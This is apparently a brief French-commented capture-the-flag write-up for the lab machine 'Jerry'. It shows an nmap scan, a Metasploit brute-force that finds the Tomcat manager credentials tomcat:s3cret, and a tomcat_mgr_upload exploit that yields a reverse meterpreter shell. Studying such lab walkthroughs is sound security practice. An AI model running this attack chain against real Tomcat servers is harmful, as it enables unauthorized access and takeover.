# Jerry 

```shell
nmap -sV -sC 10.10.10.95 -Pn
	Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-19 10:12 GMT
	Nmap scan report for 10.10.10.95
	Host is up (0.0029s latency).
	Not shown: 999 filtered tcp ports (no-response)
	PORT     STATE SERVICE VERSION
	8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
	|_http-favicon: Apache Tomcat
	|_http-server-header: Apache-Coyote/1.1
	|_http-title: Apache Tomcat/7.0.88

# Brutforce avec metasploit 
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> options
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
# on va upload reverse shell
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set httpusername tomcat
httpusername => tomcat
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set httppassword s3cret
httppassword => s3cret
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set rhosts 10.10.10.95
rhosts => 10.10.10.95
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> run
# on a meterpreter
# on recup les flags
```
